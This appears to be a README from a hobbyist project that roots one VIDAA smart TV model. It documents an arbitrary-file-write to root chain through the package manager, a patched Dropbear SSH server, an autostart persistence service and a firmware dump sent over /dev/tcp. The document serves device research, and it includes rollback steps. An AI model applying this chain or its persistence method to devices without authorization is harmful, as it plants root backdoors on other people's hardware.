# 75UR9S / V0000.09.60W.Q0624 — root SSH over the package manager (MT9655, W build)

**Status:** root SSH (uid 0, `CapEff 000001ffffffffff`, key-only) verified on
2026-11-04. **Boot persistence verified 2026-11-06**: the `re_sshd` JS service
(`serviceList.json`, `autoStart`) re-arms dropbear at every cold boot via the
superwatch trigger — no browser, no re-arm ([details below](#boot-persistence-verified-2026-11-06)).

> **Applies to `75UR9S` (MTK9655, VIDAA `U09.0`, region EU — Czech Republic) running
> `V0000.09.60W.Q0624` (kernel build 2026-06-24).** This is the 100U7Q chain
> ([guide](../../100U7Q/V0000.09.60I.Q0813/README.md)) adapted to the newer
> `09.60W` build. The differences below are measured, not assumed.
>
> **Region basis:** owner-confirmed (Czech Republic). Corroborated on-device:
> `/var/local/kilby/categoryList/` and `newVersionPreset/` ship only EU country
> presets (Austria, France, Germany, Great Britain, Spain, Czech Republic,
> Greece, Italy, Portugal, Switzerland).

## Chain (same shape as 100U7Q)

```
TV browser page
  └─ phoenix (wss://localhost:9888) FaaS "fetcher" (empty permission block)
       └─ fetchFile: arbitrary write as uid 314
            ├─ sw2.js  -> /APPS/pkgs/tv.vidaa.jsservice.basic/CHA/functions/fetch/sw2.js
            └─ installer.ipk -> /APPS/installer.ipk
  └─ POST /function/basic/fetch/sw2  (length-prefixed command to
       /var/run/superwatch_socket, group 616 reachable from uid 314)
            └─ root daemon: opkg install  ->  postinst uid 0, full caps
                 └─ patched static Dropbear 2022.83 on 0.0.0.0:8008, key-only
```

## Measured differences from the 100U7Q / 09.60I build

| Area | 100U7Q (09.60I) | 75UR9S (09.60W) — measured |
|---|---|---|
| FaaS `fetch` function location | `tv.vidaa.jsservice.system/CHA/functions/fetch/` | **`tv.vidaa.jsservice.basic/CHA/functions/fetch/`** (the system package's `current/` dir exists but has **no** `functions/` at all) |
| FaaS route | `/function/system/fetch/sw2` | **`/function/basic/fetch/sw2`** (route type `basic` → `ROOT_BASIC_JS`) |
| `fetchfile.js` | older | newer axios/AbortController/rate-limit version |
| `hiutils.fileRead` on a directory | — | returns `{errno:-21, code:"EISDIR"}` object (not a listing); files read fine, base is `/APPS/` |
| postinst log redirect | `{...} > /APPS/.re_sshd/installer_log.txt` before `mkdir -p` | **latent bug confirmed**: on a clean system the redirect fails, the whole block is silently skipped, `exit 0` still reports success. Fixed: `mkdir -p "$D"` before the redirect |
| Dropbear start flag | `-s` (disable password auth) | `-s` is `Invalid option` when the build has no password auth compiled in; this build uses `DROPBEAR_SVR_PASSWORD_AUTH 0` (key-only by compile). The shared `postinst` now tries `-s` first and retries without it, so both builds stay key-only |
| iptables | present (50A51HUV lane) | **absent** in `/sbin` — no in-kernel firewall from userspace |
| Port 8008 | allowed | allowed (answers `Connection refused` while idle) |
| SELinux | enforcing | enforcing |
| `/etc/resolv.conf` | — | symlink → `/var/local/etc/resolv.conf` (writable; DNS controllable from the TV) |

## What was done (2026-11-04)

1. Built static ARMv7 EABI5 Dropbear 2022.83 with `arm-linux-gnueabihf-gcc
   13.3 -static -no-pie` (glibc static; the 09.60I record used musl — both work,
   the binary is fully static). Patches: `fill_passwd()` fallback/uid-0 override
   (per the 100U7Q BUILD.md) and the 11-byte `/etc/shells` → `/APPS/shell`
   field patch (found by `find`, not by fixed offset).
2. `tools/u7q/web/install.html` updated: `FN_CANDIDATES` (basic first) and
   `TRIGGER_URLS` (basic first); trigger payload now sends
   `uninstall(83)` then `install(82)` in one `list`.
3. `tools/u7q/scripts/make_installer.py` postinst fixed (mkdir before log
   redirect, per-step logging, env dump, `-s` with a no-`-s` retry).
4. Result: superwatch reply `90:0` (OK); postinst log shows `pid=5012`,
   `0.0.0.0:8008` LISTEN in `/proc/net/tcp`; `ssh -p 8008 root@<tv>` gives
   `Uid: 0`, `CapEff: 000001ffffffffff`.

## Connect

```sh
ssh -p 8008 -i server/keys/tv_root_ed25519 root@<tv-ip>
# minimal PATH in the session: export PATH=/bin:/sbin:/usr/bin:/usr/sbin
```

Key-only; no password auth compiled in. PTY: the postinst `chmod 666`'d
`/dev/ptmx` (verify with `ssh -tt` if a PTY is needed).

## Re-arm after reboot

**Not needed** — boot persistence is live (below). The install page remains
the manual fallback (it sends the same uninstall + install commands).

## Rollback

- Uninstall: `{"list":["70:83:70;re.installer"]}` via the same socket path.
- Then remove: `/APPS/.re_sshd/`, `/APPS/shell`, `/APPS/installer.ipk`,
  `sw2.js` from the basic package's `functions/fetch/`, and the
  `/dev/ptmx` mode change if exact pre-run state matters.
- Verified boot untouched (erofs + dm-verity, nothing written to `/`).

## Firmware dump (2026-11-05)

Full eMMC image taken **before any persistence work**, repo method
(50A51HUV findings 07): `dd if=/dev/mmcblk0pNN bs=4M > /dev/tcp/<pc>/5555`
into an `nc` listener on the PC, byte-verified per partition, re-dump on
mismatch. **56/56 partitions, all first-try, zero mismatches** against
`/proc/partitions`. Driver script: `firmware/75ur9s-09.60w/dump_driver.sh`
(gitignored), log `dump.log`, hashes `SHA256SUMS.txt`, manifest
`manifest.txt`.

**eMMC: 29.1 GB, 56 partitions, ~15.5 GB allocated** (large unallocated
region — bigger than the 09.01O's 3.87 GB). Filesystems start at offset
1024, not 0 (1K alignment) — an erofs/ext4 magic scan at offset 0 finds
nothing.

### Partition map (measured)

| pNN | Size | Type | Mount / role |
|---|---|---|---|
| p1, p2 | 10 MB | other | boot (u-boot stage) |
| p3 | 16 MB | ext4 | — |
| p4 | 8 MB | ext4 | `/vendor/uuenv` (rw) |
| p5 | 20 MB | ext4 | `/certificate` |
| p6 | 4 MB | other | — |
| p7, p8 | 48 MB | other | A/B pair (boot config) |
| p9, p10 | 16 MB | other | A/B pair |
| p11 | 320 MB | ext4 | `/cache` (rw) |
| p12 | 320 MB | ext4 | `/data` (rw) |
| p13, p14 | 1 MB | other | — |
| p15, p16 | 4 KB | other | — |
| p17, p18 | 40 MB | other | A/B pair |
| **p19, p20** | 240 MB | erofs | **A/B pair**; dm-0 ← p20 (not mounted in `/proc/mounts` — standby slot); p19 unassigned |
| p21, p22 | 1 KB | other | — |
| p23 | 50 MB | ext4 | — |
| p24 | 50 MB | ext4 | `/config` + `/vendor/tvconfig` (ro) |
| p25 | 16 MB | other | — |
| p26 | 16 MB | ext4 | `/Customer` (rw) |
| **p27** | 240 MB | erofs | dm-5 → **`/3rd`** |
| **p28** | 160 MB | erofs | dm-1 → **`/vendor/lib`** |
| **p29** | 40 MB | erofs | dm-3 → **`/vendor/lib/utopia`** |
| **p30** | 10 MB | erofs | — |
| **p31** | 10 MB | erofs | dm-2 → **`/application`** |
| p32 | 20 MB | ext4 | `/vendor/persist` (rw) |
| p33 | 20 MB | ext4 | — |
| p34 | 16 MB | ext4 | `/project_id` (ro) |
| p35 | 4 KB | other | — |
| p36 | 16 MB | other | — |
| p37 | 1 KB | other | — |
| p38 | 64 MB | ext4 | `/vendormodel` (ro) |
| p39, p40, p41 | 1 KB | other | — |
| p42 | 4 KB | other | — |
| p43 | 64 MB | ext4 | `/logo` (ro) |
| p44 | 56 MB | ext4 | `/oemdata` (ro) |
| p45 | 16 MB | other | — (likely kernel image) |
| p46 | 800 MB | ext4 | `/serialdata` (ro) |
| p47 | 160 MB | ext4 | `/var/tvservice` (rw) |
| p48 | 32 MB | ext4 | `/hidata/critical` (ro) |
| p49 | 80 MB | ext4 | `/hidata/factory` (ro) |
| p50 | 64 MB | ext4 | `/hidata/model` (ro) |
| p51 | 32 MB | ext4 | `/hidata/common` (ro) |
| **p52** | 120 MB | erofs | **`/mnt/sysadapter`** (ro) |
| **p53** | 1.56 GB | erofs | dm-4 → **`/mnt/tvroot` (root)** |
| p54 | 4 GB | ext4 | `/APPS` (rw) |
| p55 | 1.4 GB | ext4 | `/var/local` (rw) |
| p56 | 4 GB | ext4 | `/OAD` (rw) |

### dm-verity (09.60 generation uses it for all erofs mounts)

| dm | Source | Mount |
|---|---|---|
| dm-0 | p20 | (standby, unmounted) |
| dm-1 | p28 | `/vendor/lib` |
| dm-2 | p31 | `/application` |
| dm-3 | p29 | `/vendor/lib/utopia` |
| dm-4 | p53 | `/mnt/tvroot` (root) |
| dm-5 | p27 | `/3rd` |

All erofs mounts are `ro,seclabel,relatime,user_xattr,acl,
cache_strategy=readaround` — nothing is ever written to `/`.

## Boot persistence (verified 2026-11-06)

`re_sshd` is a JS service in the basic jsservice package, autostarted by the
service manager at every boot. It re-arms dropbear through the same superwatch
trigger the install page uses — no SUID, no browser.

```
boot
  └─ phoenix host (pid varies, uid 314, domain hs_phoenix, groups incl. 616)
       runs tv.vidaa.jsservice.basic/current/phoenix.server.js
       └─ lib/serviceManager.js init()
            └─ startAutoStartServices("basic", ROOT_BASIC_JS/services/serviceList.json)
                 └─ re_sshd (autoStart: true) → services/re_sshd/index.js
                      └─ if dropbear not running:
                           /var/run/superwatch_socket (root:616, 4-byte LE len prefix)
                           ├─ "90:83:90;re.installer"            → reply "90:0" (OK)
                           └─ "91:82:91;/APPS/installer.ipk;re.installer;"  → no reply (TIMEOUT is normal)
                                └─ opkg install → postinst uid 0 → dropbear on 8008
```

**Deployed files** (repo copy: `source/re_sshd/`):

- `/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/services/re_sshd/index.js`
- `/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/services/re_sshd/package.json`
- entry appended to `CHA/services/serviceList.json`
  (`{"id":"re_sshd","autoStart":true,"isKeepAlive":false}`); pristine copy at
  `serviceList.json.pristine`. Note `current -> CHA` is a **symlink** — one
  file, same inode.

**Cold-boot evidence** (unplug/replug, uptime 67 s at check):

```
re_sshd start pid=2615 uid=314
attempt 1 uninstall=[90:0] install=[TIMEOUT]
ARMED: dropbear up          ← /APPS/.re_sshd/boot_marker.txt
dropbear Uid: 0 0 0 0       ← ssh -p 8008 works
```

Armed on the **first attempt**; the service retries every 5 s for 3 min in
case superwatch isn't up yet. Marker: `/APPS/.re_sshd/boot_marker.txt`
(dir chowned `314:702` so the service can write it — it was root-owned and
the marker silently failed before).

### Measured traps on this build

| Trap | Measured result |
|---|---|
| SUID on `/APPS` | **Impossible.** Every persistent fs (`/APPS`, `/var/local`, `/data`, `/var/tvservice`) is mounted `nosuid` — the kernel ignores the bit. A SUID `dropbear-root` on `/APPS` ran as uid 314. |
| SUID on tmpfs (`/var/run`) | Exec denied by SELinux: `hs_phoenix` cannot execute `file_inode`-labelled files (`spawn EACCES`). The phoenix binary's label is `hs_apps_file`; tmpfs files get `file_inode`. |
| SELinux SUID denial | **Not the blocker** — a SUID exec test as uid 314 ran fine under enforcing SELinux (`Dropbear v2022.83` printed); only the `nosuid` mount and the file label walls matter. |
| Re-arm strips SUID | postinst does `mv` + explicit `chmod 755` on `dropbear-root` — any SUID bit is gone after every install. |
| install() reply | No reply (15 s TIMEOUT) while the daemon runs opkg + postinst; success is detected by polling the dropbear pidfile, not the socket reply. |
| Package ids 82/83 | Runtime ids assigned by the superwatch daemon, not in `opkgmeta/status`. Stable while the package set is frozen (OTA is disabled on this unit). If they ever drift, `uninstall(83)` would hit the wrong package — the marker logs every reply, so a drift is visible. |
| Service logs | `LOG_*` goes through native `hiutils.printJsLog` → `/tmp/logservice/logfile/servicelogfile/` (rotates fast, empty by the time you look). The marker file is the reliable log. |
| `serviceList.json` hot-reload | None observed — entries take effect at next boot. |

**Teardown:** remove the `re_sshd` entry from `serviceList.json` (or restore
`serviceList.json.pristine`), `rm -r CHA/services/re_sshd`, `rm /APPS/.re_sshd/boot_marker.txt`.
Everything else (dropbear, IPK, trigger) is the standard rollback above.

## Open items

- OTA freeze: **owner disabled OTA in the TV settings menu** (2026-11-04) —
  no in-kernel freeze needed. No iptables on this build; no OTA daemon
  observed running; `/OAD` logs contain no endpoint data. (Fallback if ever
  needed: router-side block, or point `/var/local/etc/resolv.conf` at a
  sinkhole DNS — the symlink target is writable.)
- ~~Boot persistence candidates~~ **done 2026-11-06** — the `serviceList.json`
  autostart service was the answer (see [Boot persistence](#boot-persistence-verified-2026-11-06));
  the other candidates (`appinfo.json`, `run_phoenix.sh`, systemserver) are
  untested and no longer needed.
- `gettvstate`/launcher lane untested on this unit.
